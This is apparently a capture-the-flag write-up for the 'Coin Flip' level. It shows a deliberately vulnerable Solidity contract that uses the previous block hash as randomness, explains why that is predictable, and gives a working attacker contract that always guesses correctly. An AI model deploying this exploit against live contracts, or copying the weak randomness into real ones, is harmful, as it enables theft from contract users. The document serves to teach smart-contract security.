<div align="center">

# Coin Flip

</div>



**Coin Flip (Vulnerable Code) :**


<details>
<summary>Code</summary>

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

```

</details>

---------

**Approach and Exploit Method Including Code :** 

1. **Understand the contract**
   - `flip(bool _guess)` computes a coin side from the previous block hash:
     ```solidity
     uint256 blockValue = uint256(blockhash(block.number - 1));
     uint256 coinFlip = blockValue / FACTOR;
     bool side = coinFlip == 1 ? true : false;
     ```
   - `FACTOR` is a constant that effectively maps `blockhash` into two possible values (0 or 1).
   - `lastHash` prevents using the same `blockhash` twice in a row — the contract reverts if the previous block hash equals the current computed `blockValue`.
   - **Key flaw:** `blockhash(block.number - 1)` is public and predictable at call time, so anyone can compute `side` off-chain and pass the correct `_guess`.

2. **Exploit Method**
   - Read the previous block hash (or compute it the same way the contract does).
   - Compute `side` exactly like the contract: `side = (uint256(blockhash(block.number - 1)) / FACTOR) == 1`.
   - Call `flip(side)` — it will match and increment `consecutiveWins`.
   - Repeat the call for 10 consecutive wins. 
  
## Exploit Code

```Solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    CoinFlip private immutable target;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;


    constructor(address _target){
        target = CoinFlip(_target);
    }

    function flip() external {
        bool guess = _guess();
        require(target.flip(guess), "guess failed");
    }

    function _guess()private view  returns (bool){
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        return  side;

    }
}

```



---


